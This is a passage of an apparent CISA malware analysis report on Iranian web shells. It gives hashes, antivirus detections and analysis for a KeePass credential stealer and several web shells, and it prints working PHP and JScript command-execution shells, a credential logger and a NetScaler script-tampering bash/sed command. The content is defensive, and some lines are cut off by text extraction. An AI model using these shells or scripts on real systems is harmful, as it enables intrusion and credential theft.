Add-Member\nNoteproperty 'KeyFilePath' $UserKey.keyFilePath\n}\n$UserKeyObject.PSObject.TypeNames.Insert(0, 'KeePass.Keys')\n$UserKeyObject\n}\n}\n}\nelse\n{\nWrite-Verbose \"No keys found for $($KeePassProcess.ID)\"\n}\n}\n\n\n-----\n\n{\nWrite-Warning \"Only KeePass 2.X is supported at this time.\"\n}\n}\n}\n—End Malicious Powershell Code—\n**10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** KeeTheft.dll\n\n**Size** 738304 bytes\n\n**Type** PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n**MD5** dc8a91125f273090cd8d76e9e588a074\n\n**SHA1** 3455ecca61a280a1056adb69077e0c652daa3516\n\n**SHA256** 10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334\n\n**SHA512** dc25e2ff93871edeb751e99cafe0717163817bfa85bd41c941c1c8b1b5ad2c63b9935060475b65dda69edce358f2759160ce94ad663c0\n\n**ssdeep** 12288:NxOU+wucIYOW1ENXKUEHI7apPYEMMIjS3K9TodHNSIIcOECQ:NETcIYOWCNXKUEHI7apPYEMJ9TgHDpC\n\n**Entropy** 6.023616\n\nAntivirus\n\n**Ahnlab** Trojan/Win32.Tiggre\n\n**Avira** TR/PSW.KeeThief.vmqvn\n\n**BitDefender** Gen:Variant.Ursu.299323\n\n**ESET** a variant of MSIL/PSW.KeeThief.A trojan\n\n**Emsisoft** Gen:Variant.Ursu.299323 (B)\n\n**Ikarus** Trojan.MSIL.PSW\n\n**K7** Password-Stealer ( 005253fd1 )\n\n**McAfee** GenericRXIL-CE!DC8A91125F27\n\n**Microsoft Security Essentials** PWS:MSIL/KeeThief\n\n**Symantec** Trojan.Gen.MBT\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n**Compile Date** 2016-07-11 14:54:24-04:00\n\n**Import Hash** f34d5f2d4577ed6d9ceec516c1f5a744\n\n**File Description** KeeTheft\n\n**Internal Name** KeeTheft.exe\n\n**Legal Copyright** Copyright © 2016\n\n**Original Filename** KeeTheft.exe\n\n**Product Name** KeeTheft\n\n\n-----\n\n**Product Version** 1.0.0.0\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\ncb77191ad61291924938362fbb902f32 header 512 2.783814\n\n1fb4a5b09d9141362ed994c8a99b3cf5 .text 735744 6.030226\n\n2801de31bb6a6306f169ef81e5589521 .rsrc 1536 4.076679\n\necf88595c12869be20d521f1934da506 .reloc 512 0.101910\n\nRelationships\n\n10836bda2d... Related_To 913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0\n\nDescription\n\nThis file is a Windows executable written in the .NET programming language. This binary has been identified as the KeyTheft application, which\nopen source project. The primary purpose of this executable is to assist in the stealing of password credentials from the \"KeePass Password Saf\nutility software. Using this malware, an operator will be able to decrypt and extract passwords from a \"KeePass\" safe, allowing access to sensitiv\nthe ability pivot to the victim's user accounts outside of the victim's network.\n\nScreenshots\n\n**Figure 1 - Screenshot of a list of some of the source .NET files used to build this app. It matches the name of some of the source files contained**\nsource project.\n\n\n-----\n\n**g** p p j\n\n**Figure 3 - Screenshot of .NET code decompiled from the \"KcpPassword\" file contained within this binary.**\n\n**Figure 4 - Screenshot of .NET code found on the \"KeeThief\" project's GitHub page, which matches the code extracted from this malicious file.**\n\n**51e9cadeab1b33260c4ccb2c63f5860a77dd58541d7fb0840ad52d0a1abedd21**\n\nTags\n\nwebshell\n\nDetails\n\n**Name** df5bd34799e200951fcce77c1c0b42af.php\n\n**Size** 585 bytes\n\n**Type** PHP script, ASCII text\n\n**MD5** b3b1dea400464ab5dd55e44766357957\n\n\n-----\n\n**SHA1** 507a04d3faed99cee089da042913d63f1813fc2a\n\n**SHA256** 51e9cadeab1b33260c4ccb2c63f5860a77dd58541d7fb0840ad52d0a1abedd21\n\n**SHA512** f7c21a4171942edd7e0d4ab7c0b3a3a1666a3dbbed14da6af4ae3c41c7607301c0c3bc83782e22c47fe40b5297a9c1374d645d04ce3b\n\n**ssdeep** 12:yDsNaficuJwHCaBzVBbgKOBUbC3c2vaveaXivglQEyKzbShL:4sCicuJwiaRVVeubCs+ieaXiY1HShL\n\n**Entropy** 5.136531\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file is a component of a malicious web shell. It contains two PHP code blocks. The first block extracts information from a dictionary data stru\nAnalysis indicates the script extracts provided file data, such as file name, file type, file size, and the files in a temporary location. The block then\n“move_uploaded_files”. This PHP block is presumably utilized by a web shell framework to allow a remote operator to move uploaded files to a n\ncompromised system. The code contained in the function “move_uploaded_file” was not available for analysis.\n\nThe second PHP script block parses the variable $_GET for the value associated with the “cmd” key value. This value is then executed on the ta\n“system()” function. This PHP block is utilized by a web shell framework to allow a remote operator to remotely execute commands on a compro\nbelow is the (partial) code contained within this file:\n\n—Begin PHP Script—\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\necho \"Error: \" . $_FILES[\"file\"][\"error\"] . \"<br>\";\n}\nelse\n{\necho \"FILENAME: \" . $_FILES[\"file\"][\"name\"] . \"<br>\";\necho \"FILETYPE: \" . $_FILES[\"file\"][\"type\"] . \"<br>\";\necho \"FILETYPE: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB<br>\";\necho \"FILETEMPPATH: \" . $_FILES[\"file\"][\"tmp_name\"] . \" <br>\";\nmove_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"]);\n}\n?>\n<textarea name=\"textarea\" cols=\"100\" rows=\"25\" readonly>\n<?php\nif (strlen($_GET[\"cmd\"]) > 0)\n{\nsystem($_GET[\"cmd\"]);\n}\n—End PHP Script—\n**547440bd037a149ac7ac58bc5aaa65d079537e7a87dc93bb92edf0de7648761c**\n\nTags\n\nbackdoortrojanwebshell\n\nDetails\n\n**Name** df5bd34799e200951fcce77c1c0b42af_y.php\n\n**Size** 28 bytes\n\n**Type** PHP script, ASCII text\n\n**MD5** e11f9350ced37173d1e957ffe7d659b9\n\n**SHA1** ec6d63fd5695c470bc3daea500b270eca85e81f4\n\n**SHA256** 547440bd037a149ac7ac58bc5aaa65d079537e7a87dc93bb92edf0de7648761c\n\n**SHA512** ecd2ae19d5b3264821a1d88a265973b32724d2fc85b4225a23d4bc0c1aad6e8280a78de1f9024a19461a1c1b9209222eb51cb57f980\n\n**ssdeep** 3:3/a4nL:ycL\n\n**Entropy** 4.521641\n\n\n-----\n\n**ESET** PHP/WebShell.NGI trojan\n\n**Microsoft Security Essentials** Backdoor:PHP/Dirtelti.MTG\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file is a part of a larger malicious web shell framework. It is designed to extract data contained within a Request object, Base64 decode the\nredacted parameter, and then execute this data on the compromised system. The data is executed using the \"eval()\" function indicating it is expe\nJavaScript payload. The (partial) JavaScript contained within this file is displayed below:\n\n—Begin Extracted JavaScript—\n<%@ Page Language=\"Jscript\"%><%try {eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Reque\n\n[Redacted]\"])),\"unsafe\"); } catch(e) {}%>\n—End Extracted JavaScript—\n**b443032aa281440017d1dcc3ae0a70d1d30d4f2f2b3f064f95f285e243559249**\n\nTags\n\nbackdoor\n\nDetails\n\n**Name** df5bd34799e200951fcce77c1c0b42af_z.php\n\n**Size** 30 bytes\n\n**Type** PHP script, ASCII text\n\n**MD5** 8f9567ca566ab5f79081d5d17c79ee41\n\n**SHA1** 01c3da91407c43d9edee751bbd2e30e081165fdc\n\n**SHA256** b443032aa281440017d1dcc3ae0a70d1d30d4f2f2b3f064f95f285e243559249\n\n**SHA512** 45ba8f2dac9cf0982937feb42dd6a782e84a76fae84d8168d170e52908bc40033a7fab58395c4247093af3b3cb38532563aac00a15364\n\n**ssdeep** 3:3/MJHo6:0JI6\n\n**Entropy** 4.640224\n\nAntivirus\n\n**Microsoft Security Essentials** Backdoor:PHP/Dirtelti.MTG\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file is a malicious PHP script. The PHP block contained within this script retrieves data from the “k0” key contained within the local \"$_POST\nimmediately executed on the compromised system utilizing the “system()” function. This tiny script is utilized to allow an operator to remotely exe\ncompromised system. The (partial) code contained within the script is displayed below:\n\n—Begin PHP Script—\nphp system($_POST[\"k0\"]);\n—End PHP Script—\n**2944ea7d0045a1d64f3584e5803cbf3a026bd0e22bdf2e4ba1d28c6ad9e57849**\n\nTags\n\nwebshell\n\nDetails\n\n**Name** prev_sh\n\n\n-----\n\n**Size** 872 bytes\n\n**Type** Rich Text Format data, version 1, ANSI\n\n**MD5** ac07005f06ac63e5b1b0c1cd15a7a060\n\n**SHA1** 74fe38fb9b63e3d1ff112567d770aef118a31195\n\n**SHA256** 2944ea7d0045a1d64f3584e5803cbf3a026bd0e22bdf2e4ba1d28c6ad9e57849\n\n**SHA512** f2560ae09815a3011086ec1ecbdfb0102d1063dcb64a81cfb4f0d18307f0851c6f4738103024e172adb71f14982c5edcc88592f9e03f046\n\n**ssdeep** 24:EnAWZJMOvOIBCotIYZa/UKt0K7uxuOv69p:EnAWZOkOm7tIYZa/UbjUkep\n\n**Entropy** 5.386700\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file contains bash shell scripting code. The shell script is displayed below:\n\n—Begin Shell Script—\ncd /netscaler/portal/scripts;\nfor f in tips.pl themes.pl navthemes.pl rmbm.pl picktheme.pl newbm.pl savecolorprefs.pl subscription.pl PersonalBookmark.pl;\n\ndo if [ -f $f ] && ! grep \"/\\\\\\\\/\\\\\\\\\\.\\\\\\\\\\.\\\\\\\\// .*df5bd34799e200951fcce77c1c0b42af\" $f;\n\nthen sed -i .bk 's:use vars.*:use vars qw (%c);\n\nif($ENV{REQUEST_URI} =~ /\\\\/\\\\.\\\\.\\\\// \\&\\& $ENV{REQUEST_URI} !~ /df5bd34799e200951fcce77c1c0b42af/)\n\n{my $d=\"/netscaler/portal/templates\";\n\nopendir(D,$d);\n\nwhile(my $f=readdir(D))\n{if($f =~ /.xml/i)\n{unlink(\"$d/$f\");}}\nclosedir(D);\nexit 0;}:'\n\n$f;\n\nfi;\n\ndone;\n\nrm -f *.b”\n—End Shell Script—\n\nAnalysis indicates this shell script attempts to read the following system scripts contained on a victim's netscaler device and modify them if speci\nwithin the scripts:\n\n—Begin Modified Perl Scripts—\ntips.pl\nthemes.pl\nnavthemes.pl\nrmbm.pl\npicktheme.pl\nnewbm.pl\nsavecolorprefs.pl\nsubscription.pl\nPersonalBookmark.pl\n—End Modified Perl Scripts—\n\nThe netscaler system perl scripts, modified by this application, were not available for analysis.\n\n\n-----\n\np p g, g p p g\n*df5bd34799e200951fcce77c1c0b42af\". If the string is not present in the script, the malware will execute the following SED command which app\ncode to the system perl scripts:\n\n—Begin SED Command—\nsed -i .bk 's:use vars.*:use vars qw (%c);\n\nif($ENV{REQUEST_URI} =~ /\\\\/\\\\.\\\\.\\\\// \\&\\& $ENV{REQUEST_URI} !~ /df5bd34799e200951fcce77c1c0b42af/)\n\n{my $d=\"/netscaler/portal/templates\";\n\nopendir(D,$d);\n\nwhile(my $f=readdir(D))\n{if($f =~ /.xml/i)\n{unlink(\"$d/$f\");}}\nclosedir(D);\nexit 0;}:'\n—End SED Command—\n\nAnalysis of the code above indicates it will clear out all files in the \"/netscaler/portal/templates\" directory matching the regex rule “/.xml/i” if the sy\n\"$ENV(REQUEST_URI)\" variable does not contain the string \"df5bd34799e200951fcce77c1c0b42af\". This code modification appears to be utiliz\nensure the systems \"$ENV{REQUEST_URI}\" variable continues to point to a web application with the file name containing the string\n\"df5bd34799e200951fcce77c1c0b42af\".\n\nThis report contains the following web shell applications that contain the string \"df5bd34799e200951fcce77c1c0b42af\" in the file's name:\n\n--Begin Files-df5bd34799e200951fcce77c1c0b42af.php  (51e9cadeab1b33260c4ccb2c63f5860a77dd58541d7fb0840ad52d0a1abedd21)\ndf5bd34799e200951fcce77c1c0b42af_y.php (547440bd037a149ac7ac58bc5aaa65d079537e7a87dc93bb92edf0de7648761c)\ndf5bd34799e200951fcce77c1c0b42af_z.php (b443032aa281440017d1dcc3ae0a70d1d30d4f2f2b3f064f95f285e243559249)\n--End Files-\nThese web shell applications provide an operator remote C2 access over a victim's system.\n**b36288233531f7ac2e472a689ff99cb0f2ac8cba1b6ea975a9a80c1aa7f6a02a**\n\nTags\n\nbackdoortrojanwebshell\n\nDetails\n\n**Name** tiny_webshell\n\n**Size** 402 bytes\n\n**Type** Rich Text Format data, version 1, ANSI\n\n**MD5** 82e6e545c9863ed9f0df1e78d2457d13\n\n**SHA1** fdc411014e747715a2d6de93723865ac5134b600\n\n**SHA256** b36288233531f7ac2e472a689ff99cb0f2ac8cba1b6ea975a9a80c1aa7f6a02a\n\n**SHA512** cbe7374679872f635564b6da357b806ffd11f86881ea9fe9286682a73e49b152b88b01c9f6c872fb3ac04044b5d2955c92b03793877e6\n\n**ssdeep** 6:L4vrWK+dSQSm+BhYrJDeSykilDo5WZuXP7SX8R6H4cYzat7qq4+u13HfEW2A6xQ0:HKUSmsY+1AWZuDSXA6/YXF3M/Qq3\n\n**Entropy** 5.136055\n\nAntivirus\n\n**ESET** PHP/WebShell.NBV trojan\n\n**Microsoft Security Essentials** Backdoor:PHP/Chopper.C!dha\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file contains a small PHP script block that is designed to receive a web POST, extract and Base64 decode its contents, and then execute th\nsystem. The code contained within this file is displayed below:\n\n\n-----\n\ng\nphp @eval(base64_decode($_POST['citrix@[Redacted]']));?>\n—End File Data—\n\nAs illustrated within this data, the POST parameter utilized to deliver data to the script block is expected to be \"citrix@[Redacted]\". It is believed t\nTiny web shell.\n**8c9aeedeea37ee88c84b170d9cd6c6d83581e3a57671be0ba19f2c8a17bd29f3**\n\nTags\n\nremote-access-trojanwebshell\n\nDetails\n\n**Name** content\n\n**Size** 5599 bytes\n\n**Type** PHP script, ASCII text\n\n**MD5** ce868f9ed3ebd9036456da37749ab7b9\n\n**SHA1** 6099d6e21fd81c2fb85e9b157f64d2cad8fec310\n\n**SHA256** 8c9aeedeea37ee88c84b170d9cd6c6d83581e3a57671be0ba19f2c8a17bd29f3\n\n**SHA512** e69966437bb4c3a819a425c6d8197fe8b7a01d2396eaa9d8f88312834e85eba8bb53f36aceefe306cbc3affe6e843afc2a833d89f02a5e\n\n**ssdeep** 96:NqNB3EXRKYIkbu0J5vmkI0K1sZMHXN+XNyBa9M6XN2XN7Emf+qsTMUoPk4xe0tM9:O3EhFIcT+sKSZMdMyBCMQk7d5I4xptM\n\n**Entropy** 5.298102\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file is a modified copy of the open source web shell known as Chunky Tuna and provides a remote operator C2 capabilities over a comprom\nbelow is some of the code extracted from this script:\n\n—Begin Extracted Code—\n$headers = getallheaders();\n// if the header doesn't match the key\nif (array_key_exists('X-Pwd', $headers) && $headers['X-Pwd'] !== \"Ddzq1Mg6rIJDCAj7ch78vl3ZEGcXnqKjs97gs5y\") {\n_log(\"wrong pwd: \");\ndie();\n}\n// NOP, for setting cookies\nif (array_key_exists('X-Nop', $headers) && $headers[\"X-Nop\"] === \"1\") {\n_log(\"[X-Nop] Request\".print_r($headers,true));\nreturn;\n}\n\n// determine operation type\nif (array_key_exists('X-Type', $headers)) {\n$opType = $headers[\"X-Type\"];\n} else {\n$opType = \"\";\n}\n\n—————————\n\nwhile ($continue) {\n$read = array($pipes[1], $pipes[2]);\n// $write = array($pipes[0]);\n$write = NULL;\n$except = NULL;\n\n@session_start();\nif ($_SESSION[\"data\"] != \"\") {\n_log(\"Got data!\");\n// write it\n\n\n-----\n\n( p p [ ], _ [ ]);\n// wipe it\n$_SESSION[\"data\"] = \"\";\n$activity_time = microtime(true);\n}\nsession_write_close();\n$ss = stream_select($read, $write, $except, $tv_sec = 0, $tv_usec =50000);\n\n// bleh. not the best inactivity timeout...\n$now = microtime(true);\nif ($now - $activity_time > 30) {\n$continue = false;\n_log(\"Max inactivity time exceeded\");\nbreak;\n}\n\n// _log(stream_get_contents($pipes[1]));\n// next round\nif ($ss === 0) continue;\n\nif ($ss === false) {\n_log(\"\\nServer shutting down\");\n$continue = false;\nbreak;\n}\nif ($ss < 1) {\n_log(\"\\nNothing to do\");\ncontinue;\n}\n—End Extracted Code—\n\nFigures 5 and 6 contain similar code from the open source Chunky Tuna web shell.\nScreenshots\n\n**Figure 5 - Code located on the Chunky Tuna web shell project website. This sample has very similar code.**\n\n\n-----\n\n**Figure 6 - Code located on the Chunky Tuna web shell project website. This sample has very similar code.**\n\n**3b14d5eafcdb9e90326cb4146979706c85a58be3fc4706779f0ae8d744d9e63c**\n\nTags\n\nwebshell\n\nDetails\n\n**Name** content\n\n**Size** 365 bytes\n\n**Type** PHP script, ASCII text, with CRLF line terminators\n\n**MD5** 750b1bf7269ffc5860166efa8af6b34e\n\n**SHA1** f4d152a700d93703592dc3652ff7b52ef00b4f7e\n\n**SHA256** 3b14d5eafcdb9e90326cb4146979706c85a58be3fc4706779f0ae8d744d9e63c\n\n**SHA512** fcae4efb50a6e72363edfd822939ff9204ca2368963ad825e5c8b5a256255e93bc8f556cd91aa4629c53a117892e03d95aad9c4716ded\n\n**ssdeep** 6:99YpbSYDFYE9LO3b6bLAztLUJD/9RH80Ab6bLAztLUJOdLGX80Ab6bLAztLUJI5t:96RSurpOryLAztQ7H0WLAztzGX0WLAz/\n\n**Entropy** 5.142417\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file contains a single PHP script block. The script is designed to listen for incoming HTTP GET connections. The script will extract data from\nplace it into a variable named \"$username\". The script will also extract data from the ‘p’ parameter, and place it into a variable named \"$passwor\ninto the function \"file_put_contents\", along with the static string \"netscaler.1\". It appears this malicious web shell is designed to allow a remote op\naccounts to a compromised NetScaler device. This file contains the following (partial) PHP script code:\n\n\n-----\n\ng\nphp\n$username= $_GET['u'];\n$password= $_GET['p'];\nif ($username !=\"undefined\"){\nfile_put_contents(\"netscaler.1\", \"Username:\".$username.PHP_EOL,FILE_APPEND);\nfile_put_contents(\"netscaler.1\", \"Password:\".$password.PHP_EOL,FILE_APPEND);\nfile_put_contents(\"netscaler.1\", \"-----------------------------------------------------\".PHP_EOL,FILE_APPEND);\n}\n—End PHP Code—\n**4a1fc30ffeee48f213e256fa7bff77d8abd8acd81e3b2eb3b9c40bd3e2b04756**\n\nTags\n\nbackdoortrojanwebshell\n\nDetails\n\n**Name** content\n\n**Size** 57 bytes\n\n**Type** PHP script, ASCII text, with no line terminators\n\n**MD5** fd6c1e1fbe93a6c1ae97da3ddc3a381f\n\n**SHA1** a5225159267538863f8625050de94d880d54d2d4\n\n**SHA256** 4a1fc30ffeee48f213e256fa7bff77d8abd8acd81e3b2eb3b9c40bd3e2b04756\n\n**SHA512** ea392b3dd9c323ae5e41d68394a56bb13914e9311f2d98648c9b5560af3bb9f85b4ac4d5a947bce5658fa230b3902fb574e5247c6266\n\n**ssdeep** 3:E1uWATR7cNT2xrXMnFNXC4/:EEW2A6xQnqO\n\n**Entropy** 4.922815\n\nAntivirus\n\n**ESET** PHP/WebShell.NBV trojan\n\n**Microsoft Security Essentials** Backdoor:PHP/Dirtelti.MTF\n\n**NANOAV** Trojan.Html.Backdoor.fqkken\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nDescription\n\nThis file contains a small PHP script block and has been identified as a malicious web shell. It is designed to accept a POST request and extract\nthe parameter 'citrix@[Redacted]’. This data will then be decoded using a function named \"base64_decode\". The data will then be executed via t\nindicating the application expects this data to be additional PHP code. This web shell will allow a remote operator to execute additional PHP pay\nsystem. This file contains the following (partial) PHP code:\n\n—Begin PHP—\nphp @eval(base64_decode($_POST['citrix@[Redacted]']));\n—End PHP—\n## Relationship Summary\n\n99344d862e... Related_To 28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea\n\n28bc161df8... Related_To 99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc\n\n913ee2b048... Related_To 10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334\n\n10836bda2d... Related_To 913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0\n\n## Recommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organizati\nconfiguration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\n\n\n-----\n\ng q, g p y\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group un\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the fi\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Spec\n83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\n## Contact Information\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at\nURL: [https://www.cisa.gov/forms/feedback/](https://www.cisa.gov/forms/feedback/)\n\n## Document FAQ\n\n**What is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In mos**\nprovide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regardin\nanalysis.\n\n**What is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manu**\nrequest additional analysis, please contact CISA and provide information regarding the level of desired analysis.\n\n**Can I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document shou**\n[at 1-888-282-0870 or CISA Service Desk.](http://10.10.0.46/mailto:CISAservicedesk@cisa.dhs.gov)\n\n**Can I submit malware to CISA? Malware samples can be submitted via three methods:**\n\nWeb: [https://malware.us-cert.gov](https://malware.us-cert.gov/)\nE-Mail: [submit@malware.us-cert.gov](http://10.10.0.46/mailto:submit@malware.us-cert.gov)\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and p\n[Reporting forms can be found on CISA's homepage at www.cisa.gov.](http://www.cisa.gov/)\n\n## Revisions\n\nSeptember 15, 2020: Initial version\n\nNovember 2, 2020: Deleted references to a file determined to be legitimate\n\n[This product is provided subject to this Notification and this](https://us-cert.cisa.gov/privacy/notification) [Privacy & Use policy.](https://www.dhs.gov/privacy-policy)\n\n**Please share your thoughts.**\n\n[We recently updated our anonymous product survey; we'd welcome your feedback.](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://us-cert.cisa.gov/ncas/analysis-reports/ar20-259a)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-15 - Malware Analysis Report (AR20-259A)- Iranian Web Shells.pdf"
    ],
    "report_names": [
        "2020-09-15 - Malware Analysis Report (AR20-259A)- Iranian Web Shells.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535858,
    "ts_updated_at": 1743041370,
    "ts_creation_date": 1653786325,
    "ts_modification_date": 1653786325,
    "files": {
        "pdf": "https://archive.orkl.eu/01fdd7d431e109dab79fd8f74663c55c37090d52.pdf",
        "text": "https://archive.orkl.eu/01fdd7d431e109dab79fd8f74663c55c37090d52.txt",
        "img": "https://archive.orkl.eu/01fdd7d431e109dab79fd8f74663c55c37090d52.jpg"
    }
}